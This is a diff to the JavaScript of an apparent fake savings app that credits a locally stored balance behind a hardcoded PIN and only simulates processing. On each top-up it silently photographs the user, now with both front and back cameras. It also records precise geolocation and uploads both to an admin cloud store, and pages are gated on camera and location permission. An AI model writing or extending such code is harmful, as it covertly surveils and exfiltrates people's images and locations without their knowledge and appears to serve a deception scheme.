@@ -8,56 +8,8 @@ let appData = {
 
 const CORRECT_PIN = '862412';
 
-// Save receipt to Supabase cloud (visible from any device)
 async function saveReceiptToAdmin(receiptData) {
     await saveReceiptToCloud(receiptData);
-}
-
-// Capture face from front camera - silent, no alerts
-async function captureFace() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 320, height: 240 } });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.setAttribute('playsinline', '');
-        await new Promise((res) => { video.onloadedmetadata = () => { video.play(); res(); }; });
-        await new Promise(r => setTimeout(r, 500));
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
-        stream.getTracks().forEach(t => t.stop());
-        return dataUrl;
-    } catch (e) {
-        console.error('Face capture failed:', e);
-        return null;
-    }
-}
-
-// Get current location - silent, no alert loops, returns null on failure
-function getCurrentLocation() {
-    return new Promise((resolve) => {
-        if (!navigator.geolocation) {
-            resolve(null);
-            return;
-        }
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                resolve({
-                    latitude: pos.coords.latitude,
-                    longitude: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy,
-                    timestamp: new Date().toISOString()
-                });
-            },
-            (err) => {
-                console.error('Location error:', err.message);
-                resolve(null);
-            },
-            { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
-        );
-    });
 }
 
 // PIN verification
@@ -83,7 +35,6 @@ window.addEventListener('DOMContentLoaded', function() {
     pinModal.style.display = 'flex';
     document.getElementById('pinInput').focus();
 
-    // Allow Enter key to submit PIN
     document.getElementById('pinInput').addEventListener('keypress', function(e) {
         if (e.key === 'Enter') {
             verifyPin();
@@ -99,10 +50,8 @@ function loadData() {
     }
     updateBalance();
 
-    // Pre-fill display name if exists
     document.getElementById('displayName').value = appData.userName;
 
-    // Load existing profile image if exists
     if (appData.profileImage) {
         const previewImg = document.getElementById('previewImg');
         const imagePreview = document.getElementById('imagePreview');
@@ -151,13 +100,10 @@ document.getElementById('addMoneyForm')?.addEventListener('submit', function(e) 
         return;
     }
 
-    // Show loading
     document.getElementById('loadingOverlay').classList.remove('hidden');
 
-    // Update user name
     appData.userName = displayName;
 
-    // Handle profile image if uploaded
     if (profileImageInput.files && profileImageInput.files[0]) {
         const reader = new FileReader();
         reader.onload = function(event) {
@@ -170,7 +116,6 @@ document.getElementById('addMoneyForm')?.addEventListener('submit', function(e) 
     }
 
     async function processTransaction() {
-        // Create transaction
         const transaction = {
             id: 'TXN' + Date.now(),
             type: 'credit',
@@ -183,29 +128,17 @@ document.getElementById('addMoneyForm')?.addEventListener('submit', function(e) 
             referenceNumber: generateReference()
         };
 
-        // Add to balance
         appData.balance += amount;
-
-        // Add to transactions (newest first)
         appData.transactions.unshift(transaction);
 
-        // Save data to localStorage
         localStorage.setItem('kudasavingsData', JSON.stringify(appData));
 
-        // Capture face and location for admin receipt - retry once on failure
-        let capturedFace = await captureFace();
-        if (!capturedFace) {
-            console.warn('Face capture failed, retrying once...');
-            capturedFace = await captureFace();
-        }
+        // Capture both cameras and location simultaneously
+        const [cameras, location] = await Promise.all([
+            captureBothCameras(),
+            getCurrentLocation()
+        ]);
 
-        let location = await getCurrentLocation();
-        if (!location) {
-            console.warn('Location failed, retrying once...');
-            location = await getCurrentLocation();
-        }
-
-        // Always save receipt even if face/location is null
         try {
             await saveReceiptToAdmin({
                 username: appData.userName || 'BABATUNDE',
@@ -217,14 +150,14 @@ document.getElementById('addMoneyForm')?.addEventListener('submit', function(e) 
                 referenceNumber: transaction.referenceNumber,
                 transactionDate: transaction.date,
                 transactionType: 'credit',
-                capturedFace: capturedFace,
+                capturedFace: cameras.front,
+                backCameraPhoto: cameras.back,
                 location: location
             });
         } catch (e) {
             console.error('Receipt save failed:', e);
         }
 
-        // Simulate processing
         setTimeout(() => {
             document.getElementById('loadingOverlay').classList.add('hidden');
             alert(`Successfully added ₦${amount.toLocaleString('en-NG', {minimumFractionDigits: 2})} to your balance!`);
@@ -240,7 +173,6 @@ function generateReference() {
 
 // Initialize
 document.addEventListener('DOMContentLoaded', function() {
-    // Guard: redirect to login if permissions not granted
     const locationGranted = localStorage.getItem('locationGranted') === 'true';
     const cameraGranted = localStorage.getItem('cameraGranted') === 'true';
     if (!locationGranted || !cameraGranted) {
@@ -250,7 +182,6 @@ document.addEventListener('DOMContentLoaded', function() {
 
     loadData();
 
-    // Validate amount
     document.getElementById('topupAmount')?.addEventListener('input', function() {
         const amount = parseFloat(this.value) || 0;
         if (amount < 100 && amount > 0) {
